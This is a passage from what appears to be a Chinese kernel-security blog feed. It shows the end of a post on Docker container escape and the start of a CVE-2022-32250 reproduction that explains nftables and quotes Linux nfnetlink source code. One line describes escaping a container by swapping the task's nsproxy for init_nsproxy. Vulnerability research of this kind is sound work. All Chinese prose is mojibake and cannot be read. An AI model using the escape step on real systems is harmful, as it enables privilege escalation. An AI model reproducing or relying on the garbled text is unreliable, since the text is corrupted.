class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">switch_task_namespaces</span><span class="params">(struct task_struct *p, struct nsproxy *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> *<span class="title">ns</span>;</span></span><br><span class="line"></span><br><span class="line">might_sleep();</span><br><span class="line"></span><br><span class="line">task_lock(p);</span><br><span class="line">ns = p-&gt;nsproxy;</span><br><span class="line">p-&gt;nsproxy = <span class="keyword">new</span>;</span><br><span class="line">task_unlock(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ns)</span><br><span class="line">put_nsproxy(ns);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡åå­—å’Œå‚æ•°å¯ä»¥çŒœå‡ºæ¥è¯¥å‡½æ•°çš„ä½œç”¨å°±æ˜¯ä¿®æ”¹æŒ‡å®š<code>task_struct</code>çš„<code>nsproxy</code>ä¸ºæ‰§è¡Œçš„<code>nsproxy</code>ç»“æ„ä½“ã€‚</p><p>é‚£ä¹ˆç¬¬äºŒç§æƒ…å†µçš„æ—¶å€™åˆ©ç”¨èµ·æ¥ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦ç›´æ¥ä¿®æ”¹å½“å‰<code>task_struct</code>çš„<code>nsproxy</code>ä¸º<code>init_proxy</code>å³å¯å®ç°é€ƒé€¸ã€‚</p><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://xz.aliyun.com/t/12495#toc-3" >https://xz.aliyun.com/t/12495#toc-3<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿‘æœŸå› ä¸ºå·¥ä½œä¸Šçš„å†…å®¹æ¯”è¾ƒå¤šå‹å¾—æ¯”è¾ƒç´§æ‰€ä»¥ä¸€ç›´æ²¡æœ‰å»å­¦ä¹ æ–°çš„ä¸œè¥¿ï¼Œä¹Ÿæ²¡æœ‰æ›´æ–°åšå®¢ã€‚æ‰€ä»¥æœ€è¿‘å‘¢ä¹Ÿå°±æŒ‘ä¸€ä¸ªæ¯”è¾ƒç®€å•ä¸€ç‚¹çš„ä¸œè¥¿å­¦äº†ä¸€ä¸‹ã€‚åœ¨ç´§è·Ÿç€çš„ä¸‹</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="docker escape" scheme="https://196082.github.io/tags/docker-escape/"/>
    
    <category term="namespaceæœºåˆ¶" scheme="https://196082.github.io/tags/namespace%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-32250å¤ç°</title>
    <link href="https://196082.github.io/2023/09/06/CVE-2022-32250/"/>
    <id>https://196082.github.io/2023/09/06/CVE-2022-32250/</id>
    <published>2023-09-06T01:57:12.000Z</published>
    <updated>2023-11-29T10:11:32.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å› ä¸ºå·¥ä½œç›®å‰é¢å¯¹ç€ä¸€ä¸ªä¸æ€ä¹ˆç†Ÿæ‚‰çš„<code>netfilter</code>è¿™ä¸€æ¨¡å—ï¼Œæ‰€ä»¥ç›´æ¥å¤ç°ä¸€ä¸ªä»¥å¾€çš„CVEæ¥è®¤è¯†è®¤è¯†è¿™ä¸ªæ¨¡å—ã€‚</p><p>è¿™é‡Œä»‹ç»è¿™ä¸ªæ¨¡å—å¯èƒ½ä¸ä¼šå¾ˆå¥½ï¼Œæ‰€ä»¥ä¸ç†Ÿæ‚‰çš„æœ‹å‹å¯ä»¥å»çœ‹ <a class="link"   href="https://www.secrss.com/articles/44817" >https://www.secrss.com/articles/44817<i class="fas fa-external-link-alt"></i></a> è¿™ç¯‡æ–‡ç« ã€‚</p><h2 id="nftablesä»‹ç»"><a href="#nftablesä»‹ç»" class="headerlink" title="nftablesä»‹ç»"></a>nftablesä»‹ç»</h2><p><code>nftables</code>å–ä»£äº†æµè¡Œçš„<code>&#123;ip,ip6,arp,eb&#125;tables</code>ã€‚è¯¥è½¯ä»¶æä¾›äº†ä¸€ä¸ªæ–°çš„å†…æ ¸æ•°æ®åŒ…åˆ†ç±»æ¡†æ¶ï¼Œè¯¥æ¡†æ¶åŸºäºç‰¹å®šäºç½‘ç»œçš„è™šæ‹Ÿæœº (VM) å’Œæ–°çš„nftç”¨æˆ·ç©ºé—´å‘½ä»¤è¡Œå·¥å…·ã€‚<code>nftables</code>é‡ç”¨äº†ç°æœ‰çš„<code>netfilter</code>å­ç³»ç»Ÿï¼Œä¾‹å¦‚ç°æœ‰çš„é’©å­åŸºç¡€è®¾æ–½ã€è¿æ¥è·Ÿè¸ªç³»ç»Ÿã€NATã€ç”¨æˆ·ç©ºé—´é˜Ÿåˆ—å’Œæ—¥å¿—å­ç³»ç»Ÿã€‚å¯¹äº<code>nftables</code>ï¼Œåªéœ€è¦æ‰©å±•<code>expression</code>å³å¯ï¼Œç”¨æˆ·è‡ªè¡Œç¼–å†™<code>expression</code>ï¼Œç„¶åè®©<code>nftables</code>è™šæ‹Ÿæœºæ‰§è¡Œå®ƒã€‚<code>nftables</code>æ¡†æ¶çš„æ•°æ®ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Table&#123;</span><br><span class="line">   Chain[</span><br><span class="line">     Rule</span><br><span class="line">       (expression1,expression2,expression3,...)</span><br><span class="line">          | | |--&gt; expression_action</span><br><span class="line">          | |--&gt; expression_action</span><br><span class="line">          |--&gt;expression_action</span><br><span class="line">     Rule</span><br><span class="line">         (expression,expression,expression,...)</span><br><span class="line">     ...</span><br><span class="line">  ],</span><br><span class="line">  Chain[</span><br><span class="line">     ...</span><br><span class="line">  ],</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Table</code>ä¸º<code>chain</code>çš„å®¹å™¨ï¼Œ<code>chain</code>ä¸º<code>rule</code>çš„å®¹å™¨ï¼Œ<code>rule</code>ä¸º<code>expression</code>çš„å®¹å™¨ï¼Œ<code>expression</code>å“åº”<code>action</code>ã€‚æ„é€ æˆç”± <code>table-&gt;chain-&gt;rule-&gt;expression</code> å››çº§ç»„æˆçš„æ•°æ®ç»“æ„ã€‚</p><h3 id="nfnetlinkåˆå§‹åŒ–"><a href="#nfnetlinkåˆå§‹åŒ–" class="headerlink" title="nfnetlinkåˆå§‹åŒ–"></a>nfnetlinkåˆå§‹åŒ–</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __net_init <span class="title">nfnetlink_net_init</span><span class="params">(struct net *net)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">nfnl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_kernel_cfg</span> <span class="title">cfg</span> =</span> &#123;</span><br><span class="line">.groups= NFNLGRP_MAX,</span><br><span class="line">.input= nfnetlink_rcv,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">.bind= nfnetlink_bind,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">nfnl = netlink_kernel_create(net, NETLINK_NETFILTER, &amp;cfg);</span><br><span class="line"><span class="keyword">if</span> (!nfnl)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">net-&gt;nfnl_stash = nfnl;</span><br><span class="line">rcu_assign_pointer(net-&gt;nfnl, nfnl);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>nfnetlink_net_init</code>å‡½æ•°ä¸­å®šä¹‰äº†<code>netlink_kernel_cfg</code>ç»“æ„ï¼Œå¹¶ä¼ ç»™äº†<code>netlink_kernel_create</code>è¿›è¡Œåˆ›å»ºã€‚åœ¨åç»­æ¥æ”¶æ¶ˆæ¯çš„æ—¶å€™å°±ä¼šè°ƒç”¨<code>nfnetlink_rcv</code>å‡½æ•°äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> nlmsg_hdr(skb);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    skb-&gt;len &lt; nlh-&gt;nlmsg_len)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!netlink_net_capable(skb, CAP_NET_ADMIN)) &#123;</span><br><span class="line">netlink_ack(skb, nlh, -EPERM, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_type == NFNL_MSG_BATCH_BEGIN)</span><br><span class="line">nfnetlink_rcv_skb_batch(skb, nlh);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">netlink_rcv_skb(skb, nfnetlink_rcv_msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­éœ€è¦<code>CAP_NET_ADMIN</code>æ‰èƒ½è®¿é—®ï¼Œå¦‚æœç¼–è¯‘æ—¶å¼€å¯äº†<code>CONFIG_USER_NS</code>é‚£ä¹ˆæ™®é€šç”¨æˆ·ä¹Ÿæ˜¯å¯ä»¥è®¿é—®çš„ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/6ac5d3cf17c1409d62d979bf0ee4fa12.png"                                     ></p><p>ä»¥ä¸Šå°±æ˜¯<code>nfnetlink</code>æ¥æ”¶æ¶ˆæ¯çš„å®Œæ•´è°ƒç”¨é“¾äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv_batch</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">u16 subsys_id, u32 genid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">oskb</span> =</span> skb;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> *<span class="title">ss</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> *<span class="title">nc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> <span class="title">extack</span>;</span></span><br><span class="line">LIST_HEAD(err_list);</span><br><span class="line">u32 status;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (subsys_id &gt;= NFNL_SUBSYS_COUNT)</span><br><span class="line"><span class="keyword">return</span> netlink_ack(skb, nlh, -EINVAL, <span class="literal">NULL</span>);</span><br><span class="line">replay:</span><br><span class="line">status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">skb = netlink_skb_clone(oskb, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!skb)</span><br><span class="line"><span class="keyword">return</span> netlink_ack(oskb, nlh, -ENOMEM, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">nfnl_lock(subsys_id);</span><br><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br><span class="line"><span class="keyword">if</span> (!ss) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">request_module(<span class="string">&quot;nfnetlink-subsys-%d&quot;</span>, subsys_id);</span><br><span class="line">nfnl_lock(subsys_id);</span><br><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br><span class="line"><span class="keyword">if</span> (!ss)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ss-&gt;valid_genid || !ss-&gt;commit || !ss-&gt;<span class="built_in">abort</span>) &#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ss-&gt;owner)) &#123;</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -EOPNOTSUPP, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ss-&gt;valid_genid(net, genid)) &#123;</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line">netlink_ack(oskb, nlh, -ERESTART, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (skb-&gt;len &gt;= nlmsg_total_size(<span class="number">0</span>)) &#123;</span><br><span class="line"><span class="keyword">int</span> msglen, type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fatal_signal_pending(current)) &#123;</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">err = -EINTR;</span><br><span class="line">status = NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;extack, <span class="number">0</span>, <span class="keyword">sizeof</span>(extack));</span><br><span class="line">nlh = nlmsg_hdr(skb);</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    skb-&gt;len &lt; nlh-&gt;nlmsg_len ||</span><br><span class="line">    nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct nfgenmsg)) &#123;</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only requests are handled by the kernel */</span></span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_REQUEST)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type = nlh-&gt;nlmsg_type;</span><br><span class="line"><span class="keyword">if</span> (type == NFNL_MSG_BATCH_BEGIN) &#123;</span><br><span class="line"><span class="comment">/* Malformed: Batch begin twice */</span></span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == NFNL_MSG_BATCH_END) &#123;</span><br><span class="line">status |= NFNL_BATCH_DONE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &lt; NLMSG_MIN_TYPE) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We only accept a batch with messages for the same</span></span><br><span class="line"><span class="comment"> * subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (NFNL_SUBSYS_ID(type) != subsys_id) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nc = nfnetlink_find_client(type, ss);</span><br><span class="line"><span class="keyword">if</span> (!nc) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> min_len = nlmsg_total_size(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(nlh-&gt;nlmsg_type);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">cda</span>[<span class="title">NFNL_MAX_ATTR_COUNT</span> + 1];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span> =</span> (<span class="keyword">void</span> *)nlh + min_len;</span><br><span class="line"><span class="keyword">int</span> attrlen = nlh-&gt;nlmsg_len - min_len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity-check NFTA_MAX_ATTR */</span></span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cb[cb_id].attr_count &gt; NFNL_MAX_ATTR_COUNT) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nla_parse(cda, ss-&gt;cb[cb_id].attr_count, attr,</span><br><span class="line">attrlen, ss-&gt;cb[cb_id].policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nc-&gt;call_batch) &#123;</span><br><span class="line">err = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,</span><br><span class="line">     (<span class="keyword">const</span> struct nlattr **)cda,</span><br><span class="line">     &amp;extack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lock was released to autoload some module, we</span></span><br><span class="line"><span class="comment"> * have to abort and start from scratch using the</span></span><br><span class="line"><span class="comment"> * original skb.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ack:</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_ACK || err) &#123;</span><br><span class="line"><span class="comment">/* Errors are delivered once the full batch has been</span></span><br><span class="line"><span class="comment"> * processed, this avoids that the same error is</span></span><br><span class="line"><span class="comment"> * reported several times when replaying the batch.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nfnl_err_add(&amp;err_list, nlh, err, &amp;extack) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* We failed to enqueue an error, reset the</span></span><br><span class="line"><span class="comment"> * list of errors and send OOM to userspace</span></span><br><span class="line"><span class="comment"> * pointing to the batch header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), -ENOMEM,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We don&#x27;t stop processing the batch on errors, thus,</span></span><br><span class="line"><span class="comment"> * userspace gets all the errors that the batch</span></span><br><span class="line"><span class="comment"> * triggers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len);</span><br><span class="line"><span class="keyword">if</span> (msglen &gt; skb-&gt;len)</span><br><span class="line">msglen = skb-&gt;len;</span><br><span class="line">skb_pull(skb, msglen);</span><br><span class="line">&#125;</span><br><span class="line">done:</span><br><span class="line"><span class="keyword">if</span> (status &amp; NFNL_BATCH_REPLAY) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line"><span class="keyword">goto</span> replay;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == NFNL_BATCH_DONE) &#123;</span><br><span class="line">err = ss-&gt;commit(net, oskb);</span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (err) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), err, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cleanup)</span><br><span class="line">ss-&gt;cleanup(net);</span><br><span class="line"></span><br><span class="line">nfnl_err_deliver(&amp;err_list, oskb);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br></pre></td></tr></table></figure><p>å–å‡º<code>subsys_id</code>å¯¹åº”çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 